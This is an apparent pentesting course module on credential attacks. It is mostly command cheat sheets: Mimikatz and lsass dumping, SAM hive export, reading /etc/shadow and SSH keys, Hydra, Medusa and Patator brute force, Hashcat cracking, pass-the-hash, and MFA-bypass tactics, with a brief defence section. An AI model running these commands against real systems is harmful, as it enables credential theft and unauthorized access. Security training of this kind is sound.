# Introduction to Hacking User Credentials and Cracking Passwords

## Introduction

User credentials are often the weakest link in security. This module covers techniques for obtaining, cracking, and exploiting user credentials, as well as understanding password security mechanisms.

## Why Target Credentials?

- **Easy Entry**: Weak passwords are common
- **Privilege Access**: Valid credentials provide legitimate access
- **Lateral Movement**: Credentials enable movement within networks
- **Persistence**: Less suspicious than exploits
- **Reuse**: Users often reuse passwords across systems

## Password Security Fundamentals

### Password Storage Methods

1. **Plaintext** (Never acceptable)
2. **Hashing** (One-way cryptographic function)
3. **Salted Hashing** (Hash + random salt)
4. **Key Derivation Functions** (PBKDF2, bcrypt, scrypt, Argon2)

### Common Hash Types

```
MD5: 5f4dcc3b5aa765d61d8327deb882cf99
SHA1: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
SHA256: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
bcrypt: $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
NTLM: 8846f7eaee8fb117ad06bdd830b7586c
```

## Credential Harvesting Techniques

### 1. Phishing

- **Credential Harvesting Sites**: Fake login pages
- **Email Phishing**: Malicious links and attachments
- **Spear Phishing**: Targeted attacks
- **SMS Phishing (Smishing)**: Text message attacks
- **Voice Phishing (Vishing)**: Phone-based attacks

### 2. Network Sniffing

```bash
# Capture network traffic
tcpdump -i eth0 -w capture.pcap

# Wireshark filtering
http.request.method == "POST"
ftp.request.command == "PASS"

# Ettercap MITM
ettercap -T -M arp:remote /target_ip/ /gateway_ip/

# Responder (LLMNR/NBT-NS poisoning)
responder -I eth0 -wrf
```

### 3. Credential Dumping

**Windows Systems:**

```bash
# Mimikatz
mimikatz.exe
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets

# Windows Credential Manager
cmdkey /list
vaultcmd /listcreds:"Windows Credentials"

# SAM database
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
```

**Linux Systems:**

```bash
# /etc/shadow (requires root)
cat /etc/shadow

# SSH keys
cat ~/.ssh/id_rsa

# Browser saved passwords
# Chrome: ~/.config/google-chrome/Default/Login Data
# Firefox: ~/.mozilla/firefox/*.default/logins.json
```

### 4. Database Extraction

```sql
-- MySQL
SELECT user, password FROM mysql.user;

-- PostgreSQL
SELECT usename, passwd FROM pg_shadow;

-- MSSQL
SELECT name, password_hash FROM sys.sql_logins;
```

### 5. Memory Dumping

```bash
# Process memory dump
procdump -ma lsass.exe lsass.dmp

# Parse dump with Mimikatz
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

## Password Cracking Techniques

### 1. Dictionary Attacks

Using wordlists of common passwords.

```bash
# Hashcat dictionary attack
hashcat -m 0 -a 0 hashes.txt rockyou.txt

# John the Ripper
john --wordlist=rockyou.txt hashes.txt

# Hydra (online)
hydra -l admin -P passwords.txt ssh://target.com
```

### 2. Brute Force Attacks

Trying all possible combinations.

```bash
# Hashcat brute force
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a

# Character sets:
# ?l = lowercase (a-z)
# ?u = uppercase (A-Z)
# ?d = digits (0-9)
# ?s = special characters
# ?a = all characters
```

### 3. Rule-Based Attacks

Applying transformation rules to wordlists.

```bash
# Common rules
# Append numbers: password -> password123
# Capitalize: password -> Password
# Leet speak: password -> p@ssw0rd

# Hashcat with rules
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# John the Ripper with rules
john --wordlist=wordlist.txt --rules hashes.txt
```

### 4. Hybrid Attacks

Combining dictionary and brute force.

```bash
# Dictionary + mask
hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d

# Mask + dictionary
hashcat -m 0 -a 7 hashes.txt ?d?d?d?d wordlist.txt
```

### 5. Rainbow Tables

Precomputed hash tables for faster cracking.

```bash
# Generate rainbow tables
rtgen md5 loweralpha 1 7 0 3800 33554432 0

# Crack with rainbow tables
rcrack *.rt -h 5f4dcc3b5aa765d61d8327deb882cf99
```

## Essential Tools

### Offline Cracking

**Hashcat** (GPU-accelerated)
```bash
# Identify hash type
hashcat --example-hashes | grep -i "ntlm"

# Crack NTLM hash
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt

# Show cracked passwords
hashcat -m 1000 ntlm.txt --show

# Benchmark
hashcat -b
```

**John the Ripper**
```bash
# Auto-detect hash format
john hashes.txt

# Specify format
john --format=raw-md5 hashes.txt

# Show cracked passwords
john --show hashes.txt

# Incremental mode
john --incremental hashes.txt
```

**Ophcrack** (Windows passwords with rainbow tables)

### Online Cracking

**Hydra** (Network protocol attacks)
```bash
# SSH brute force
hydra -l admin -P passwords.txt ssh://target.com

# HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# FTP
hydra -l admin -P passwords.txt ftp://target.com

# Multiple users
hydra -L users.txt -P passwords.txt ssh://target.com
```

**Medusa** (Alternative to Hydra)
```bash
# SSH attack
medusa -h target.com -u admin -P passwords.txt -M ssh

# Multiple protocols
medusa -h target.com -U users.txt -P passwords.txt -M http
```

**Patator** (Multi-protocol brute forcer)
```bash
# SSH
patator ssh_login host=target.com user=admin password=FILE0 0=passwords.txt

# HTTP
patator http_fuzz url=http://target.com/login method=POST body='user=admin&pass=FILE0' 0=passwords.txt
```

### Password Analysis

**CUPP** (Common User Passwords Profiler)
```bash
# Generate targeted wordlist
cupp -i
```

**CeWL** (Custom Word List generator)
```bash
# Spider website and create wordlist
cewl -d 2 -m 5 https://target.com -w wordlist.txt
```

**Crunch** (Wordlist generator)
```bash
# Generate wordlist
crunch 8 8 -t @@@@%%%% -o wordlist.txt
# @ = lowercase
# , = uppercase
# % = numbers
# ^ = special characters
```

## Hash Identification

```bash
# hash-identifier
hash-identifier

# hashid
hashid 5f4dcc3b5aa765d61d8327deb882cf99

# Online tools
# https://www.tunnelsup.com/hash-analyzer/
```

## Attack Vectors by Protocol

### SSH
```bash
hydra -l root -P passwords.txt ssh://target.com
medusa -h target.com -u root -P passwords.txt -M ssh
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt target.com
```

### RDP
```bash
hydra -l administrator -P passwords.txt rdp://target.com
ncrack -u administrator -P passwords.txt rdp://target.com
```

### SMB
```bash
hydra -l administrator -P passwords.txt smb://target.com
crackmapexec smb target.com -u users.txt -p passwords.txt
```

### HTTP/HTTPS
```bash
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"
wfuzz -c -z file,passwords.txt --hc 404 http://target.com/login?password=FUZZ
```

### FTP
```bash
hydra -l admin -P passwords.txt ftp://target.com
nmap --script ftp-brute -p 21 target.com
```

### Database
```bash
# MySQL
hydra -l root -P passwords.txt mysql://target.com

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://target.com

# MSSQL
hydra -l sa -P passwords.txt mssql://target.com
```

## Wordlists

### Popular Wordlists

```bash
# RockYou (14 million passwords)
/usr/share/wordlists/rockyou.txt

# SecLists
/usr/share/seclists/Passwords/

# Common passwords
/usr/share/wordlists/fasttrack.txt

# Kali default wordlists
/usr/share/wordlists/
```

### Online Resources

- **SecLists**: https://github.com/danielmiessler/SecLists
- **Have I Been Pwned**: https://haveibeenpwned.com/Passwords
- **WeakPass**: https://weakpass.com/
- **CrackStation**: https://crackstation.net/

## Pass-the-Hash Attacks

Authenticating with hash instead of password.

```bash
# Mimikatz
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe

# CrackMapExec
crackmapexec smb target.com -u Administrator -H NTLM_HASH

# Impacket
psexec.py -hashes :NTLM_HASH administrator@target.com
```

## Multi-Factor Authentication (MFA) Bypass

- **Social Engineering**: Trick users into approving MFA
- **Session Hijacking**: Steal authenticated session tokens
- **MFA Fatigue**: Spam MFA requests until user approves
- **Backup Codes**: Target backup authentication methods
- **SIM Swapping**: Hijack phone numbers for SMS-based MFA

## Defense Mechanisms

### Password Policies

- Minimum length (12+ characters)
- Complexity requirements
- Password history
- Account lockout policies
- Password expiration (controversial)

### Technical Controls

- **Rate Limiting**: Slow down brute force attempts
- **CAPTCHA**: Prevent automated attacks
- **Account Lockout**: Temporary disable after failed attempts
- **MFA**: Require second factor
- **Password Managers**: Encourage strong, unique passwords
- **Breach Monitoring**: Alert users of compromised credentials

## Best Practices for Pentesters

- **Authorization**: Only test authorized systems
- **Rate Limiting**: Don't cause account lockouts
- **Documentation**: Record all attempts and findings
- **Responsible Disclosure**: Report findings appropriately
- **Cleanup**: Remove any created accounts or backdoors
- **Legal Awareness**: Understand CFAA and local laws

## Practical Exercises

1. Crack MD5 hashes from a sample database
2. Perform SSH brute force on your lab
3. Extract and crack Windows SAM hashes
4. Create custom wordlist based on target information
5. Test different hash types with Hashcat

## Resources

- [Hashcat Documentation](https://hashcat.net/wiki/)
- [John the Ripper Documentation](https://www.openwall.com/john/doc/)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [CrackStation](https://crackstation.net/)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)

## Next Steps

After understanding credential attacks, you'll learn about exploiting databases directly through injection and other database-specific attacks.

